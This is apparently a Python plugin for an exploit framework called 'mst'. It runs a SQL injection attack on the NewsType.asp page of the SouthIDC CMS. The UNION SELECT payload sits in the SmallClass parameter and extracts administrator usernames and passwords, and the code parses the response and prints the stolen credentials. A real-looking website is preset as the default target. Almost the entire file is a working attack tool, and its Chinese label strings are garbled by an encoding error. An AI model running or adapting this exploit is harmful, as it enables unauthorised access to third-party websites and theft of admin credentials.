
# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
Southidc=>NewsType.asp=>SqlInject
'''
class mstplugin:
    '''southidc sqlinject'''
    infos = [
        ['���','SouthIDC NewsType.asp SqlInject Exp'],
        ['����','mst'],
        ['����','2013/10/20'],
        ['��ַ','http://mstoor.duapp.com']
        ]
    opts  = [
        ['RURL','www.lvliantian.com','Ŀ��URL'],
        ['RPATH','/','CMS·��'],
        ['RPORT','80','Ŀ��˿�'],
        ['PAYLOAD','false',"����Ҫ�󹥻����"]
        ]
    def exploit(self):
        '''start exploit'''
        if RPORT == '443':
            url = 'https://%s%s'%(RURL,RPATH)
        else:
            url = 'http://%s:%s%s'%(RURL,RPORT,RPATH)
        exp = url+"NewsType.asp?SmallClass='%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20''='"
        color.cprint("[*] Sending exp..",YELLOW)
        ok  = fuck.urlget(exp)
        if ok.getcode() == 200:
            tmp=fuck.find('[>]+\w+[|]+\w+[<]+',ok.read())
            if len(tmp)>0:
                color.cprint("[*] Exploit Successful !",GREEN)
                i=1
                for res in tmp:
                    res=res[1:len(res)-1]
                    color.cprint("[%s] %s"%(i,res),GREEN)
                    i+=1
            else:
                color.cprint("[!] TARGET NO VULNERABLE !",RED)
        else:
            color.cprint("[!] EXPLOIT FALSE ! CODE:%s"%ok.getcode(),RED)